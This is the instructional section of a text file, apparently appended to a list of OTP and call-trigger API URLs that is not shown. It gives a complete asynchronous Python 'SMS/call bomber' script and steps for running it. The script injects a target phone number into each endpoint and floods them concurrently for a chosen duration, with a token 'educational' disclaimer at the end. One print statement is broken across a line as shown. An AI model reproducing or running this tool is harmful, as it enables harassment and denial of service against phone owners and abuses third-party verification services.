================================================================================
# METHOD: HOW TO BUILD AN SMS/CALL BOMBER USING THESE APIs
================================================================================

The list above contains raw API endpoints used for triggering OTPs or Calls. 
To build a bomber, you need to write a script that sends HTTP requests (GET/POST) 
to these URLs concurrently.

Below is an example of a high-speed, asynchronous Python script using 'aiohttp' 
that can take a target phone number and blast these APIs.

### Prerequisites:
1. Install Python (3.7+)
2. Install aiohttp by running: `pip install aiohttp`

### Bomber Example Code (Python):

```python
import aiohttp
import asyncio
import time

# Function to read APIs from this text file
def load_apis(filename='bomber_apis.txt'):
    apis = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                # Ignore this instructional section and empty lines
                if not url or url.startswith('=') or url.startswith('#') or ' ' in url:
                    continue
                if url.startswith('http'):
                    apis.append(url)
    except FileNotFoundError:
        print(f"Error: Could not find {filename}. Make sure it is in the same folder.")
    return apis

async def hit_api(session, url, target_number):
    # This is a generalized approach: we replace placeholders if any exist
    formatted_url = url.replace('{target}', target_number).replace('{num}', target_number).replace('{phone}', target_number)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    
    try:
        # A simple bomber tries GET first. You can also implement POST logic for specific APIs.
        async with session.get(formatted_url, headers=headers, timeout=5) as response:
            if response.status in [200, 201, 202, 204]:
                return True
    except Exception:
        pass
    return False

async def start_attack(target_number, duration_seconds=60):
    apis = load_apis()
    if not apis:
        return
        
    print(f"[+] Loaded {len(apis)} APIs from the text file.")
    print(f"[+] Starting attack on {target_number} for {duration_seconds} seconds...")
    
    end_time = time.time() + duration_seconds
    success_count = 0
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            tasks = []
            # Fire multiple requests concurrently
            for url in apis[:100]:  
                tasks.append(hit_api(session, url, target_number))
            
            results = await asyncio.gather(*tasks)
            success_count += sum(bool(r) for r in results)
            
            # Small delay to prevent local port exhaustion and rate limits
            await asyncio.sleep(0.5)
            
    print(f"[!] Attack Finished. Estimated Successful Hits: {success_count}")

if __name__ == '__main__':
    print("=== ASYNC SMS/CALL BOMBER ===")
    target = input("Enter target phone number (without country code if local): ")
    try:
        duration = int(input("Enter duration (seconds): "))
        asyncio.run(start_attack(target, duration))
    except KeyboardInterrupt:
        print("
[!] Attack manually stopped.")
```

### Instructions:
1. Save this entire text file exactly as `bomber_apis.txt`.
2. Copy the Python code above into a new file named `bomber.py` in the same folder.
3. Open a terminal or command prompt in that folder and run `python bomber.py`.
4. The script will automatically read the APIs from `bomber_apis.txt` and execute the attack.

NOTE: This is provided for educational and authorized testing purposes.
